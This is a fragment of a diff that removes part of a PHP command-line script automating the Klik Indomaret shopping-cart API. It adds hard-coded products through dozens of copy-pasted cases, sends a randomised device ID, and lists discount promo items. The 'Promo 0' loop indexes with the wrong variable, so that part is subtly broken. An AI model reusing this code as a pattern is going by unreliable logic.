-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=2af4c0d7-76b7-4390-8438-78ab7cd3f8ae&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '23':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=ca4e7974-450a-41ef-b3ab-ee189bce97b0&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '24':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=56ee2840-d08c-481f-86b2-34affe736dd3&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '25':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=658e8a31-3e6a-4425-83b7-8e6079fa206c&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '26':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=b062eea5-cc8f-4897-92c3-a560293f8d6b&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '27':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=d997fe83-6912-4300-975e-c699e6391ad5&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '28':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=5adfffd2-3a8f-4d2b-a873-5872817a656b&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '29':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=1a7b390b-54fb-40ca-97f9-5aab4805804c&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '30':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=c00c3747-70bf-47c0-bd31-77e4d371a8fb&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '31':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=cafe5db9-d192-4474-819b-04ffcddb459e&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '32':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=9c14783e-4920-4193-b2ea-c9e63e4e5e69&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '33':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=e946f2ae-96ba-457b-94f3-b1bd978ef14c&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '34':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=c15b0488-a668-482e-b289-97b97e99d6cd&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '35':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=eeabb0e8-06d2-4572-b9e7-e778eeae872b&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '36':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=d1143989-51da-4f9d-b485-f71fc35fcd9c&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '37':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=1f1ce1ca-c818-4577-a454-0d325345e17e&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '38':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=04d6e984-06df-4de3-90d8-ae75fa3bfb26&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-						case '39':
-							echo @color('yellow', "JUMLAH : ");
-							$qty = trim(fgets(STDIN));
-							$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=7b81699c-46ab-4648-97af-f7a43507f14e&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-							if (strpos($addproduk[1], '"Success":true')) {
-								$SCID = json_decode($addproduk[1])[0]->ResponseID;
-								$stt = json_decode($addproduk[1])[0]->Message;
-								echo @color('green', "{$stt}\n");
-							} else {
-								$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-								$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-								$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-								echo @color('red', "{$stt}\n");
-								echo @color('red', "Jumlah Order : {$stt1}\n");
-								echo @color('red', "Jumlah Stock : {$stt2}\n");
-							}
-							echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-							$againx = trim(fgets(STDIN));
-							if (strtolower($againx) == 'y') {
-								goto pilihproduk;
-							}
-							break;
-					}
-					$DEVICE_ID = urut(16);
-					$cekk = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-					$json = json_decode($cekk[1]);
-					$tokonejon = $json[0]->CheckStockModel->StoreCode;
-					$tokonejon1 = $json[0]->CheckStockModel->StoreName;
-					$tokonejon2 = $json[0]->CheckStockModel->StoreAddress;
-					$storeid = $json[0]->CheckStockModel->StoreID;
-					$RegionID = $json[0]->CheckStockModel->RegionID;
-					$DistrictID = $json[0]->CheckStockModel->DistrictID;
-					$gettoko = curlx('https://api.klikindomaret.com/api/Store/GetAllStoreByCode?storeCode=' . $kodetoko . '&customerLatitude=-6.78542505&customerLongitude=112.19929015', null, $kuntul);
-					$ZipCode = json_decode($gettoko[1])[0]->ZipCode;
-					echo @color('nevy', "KODE TOKO : {$tokonejon}\n");
-					echo @color('nevy', "NAMA TOKO : {$tokonejon1}\n");
-					echo @color('nevy', "ALAMAT TOKO : {$tokonejon2}\n");
-					foreach ($json[0]->CartItemNotification->Items as $mydata) {
-						$cx = $mydata;
-						foreach ($cx->ShoppingCartItems as $myxxx) {
-							$idne = $myxxx->Quantity;
-							$prduk = $myxxx->ProductDescription;
-							echo @color('yellow', "{$prduk} == {$idne}\n");
-						}
-					}
-					echo @color('yellow', "CEK TEBUS MURAH (y / n )? ");
-					$againx = trim(fgets(STDIN));
-					if (strtolower($againx) == 'y') {
-						goto tebusmurah;
-					} else {
-						goto tanpatebus;
-					}
-					tebusmurah:
-					$ajgjuga = json_decode($cekk[1], true);
-					$o1 = "0";
-					$o2 = "10";
-					echo "Promo 0 :\n";
-					for ($o1; $o1 < $o2; $o1++) {
-						$district = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][$a1]["Product"]["Description"];
-						$hargadis = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][$a1]["PriceWithDiscount"];
-						$setoke = @$ajgjuga[0]["CartItemNotification"]["Items"][0]["ShoppingCartItems"][$a1]["AvailableQuantityStock"];
-						echo @color('nevy', "[{$a1}]");
-						echo "=> ";
-						echo @color('yellow', "{$district}");
-						echo @color('green', " : {$hargadis}");
-						echo @color('nevy', " =>> {$setoke}");
-						echo "\n";
-						if ($district == "") {
-							break;
-						}
-					}
-					echo "\n";
-					$a1 = "0";
-					$a2 = "10";
-					echo "Promo 1 :\n";
-					for ($a1; $a1 < $a2; $a1++) {
-						$district = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][$a1]["Product"]["Description"];
-						$hargadis = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][$a1]["PriceWithDiscount"];
-						$setoke = @$ajgjuga[0]["CartItemNotification"]["Items"][1]["ShoppingCartItems"][$a1]["AvailableQuantityStock"];
-						echo @color('nevy', "[{$a1}]");
-						echo "=> ";
-						echo @color('yellow', "{$district}");
-						echo @color('green', " : {$hargadis}");
-						echo @color('nevy', " =>> {$setoke}");
-						echo "\n";
-						if ($district == "") {
-							break;
-						}
-					}
-					echo "\n";
-					echo "Promo 2 :\n";
-					$b1 = "0";
-					$b2 = "10";
-					for ($b1; $b1 < $b2; $b1++) {
-						$district = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][$b1]["Product"]["Description"];
-						$hargadis = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][$b1]["PriceWithDiscount"];
-						$setoke = @$ajgjuga[0]["CartItemNotification"]["Items"][2]["ShoppingCartItems"][$b1]["AvailableQuantityStock"];
-						echo @color('nevy', "[{$b1}]");
-						echo "=> ";
-						echo @color('yellow', "{$district}");
-						echo @color('green', " : {$hargadis}");
-						echo @color('nevy', " =>> {$setoke}");
-						echo "\n";
-						if ($district == "") {
-							break;
-						}
-					}
-					echo "\n";
-					echo "Promo 3 :\n";
-					$c1 = "0";
-					$c2 = "10";
-					for ($c1; $c1 < $c2; $c1++) {
-						$district = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][$c1]["Product"]["Description"];
-						$hargadis = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][$c1]["PriceWithDiscount"];
-						$setoke = @$ajgjuga[0]["CartItemNotification"]["Items"][3]["ShoppingCartItems"][$c1]["AvailableQuantityStock"];
-						echo @color('nevy', "[{$c1}]");
-						echo "=> ";
-						echo @color('yellow', "{$district}");
-						echo @color('green', " : {$hargadis}");
-						echo @color('nevy', " =>> {$setoke}");
-						echo "\n";
-						if ($district == "") {
-							break;
-						}
-					}
-					echo "\n";
-					echo "Promo 4 :\n";
-					$d1 = "0";
-					$d2 = "10";
-					for ($d1; $d1 < $d2; $d1++) {
-						$district = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][$d1]["Product"]["Description"];
-						$hargadis = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][$d1]["PriceWithDiscount"];
-						$setoke = @$ajgjuga[0]["CartItemNotification"]["Items"][4]["ShoppingCartItems"][$d1]["AvailableQuantityStock"];
-						echo @color('nevy', "[{$d1}]");
-						echo "=> ";
-						echo @color('yellow', "{$district}");
-						echo @color('green', " : {$hargadis}");
-						echo @color('nevy', " =>> {$setoke}");
-						echo "\n";
-						if ($district == "") {
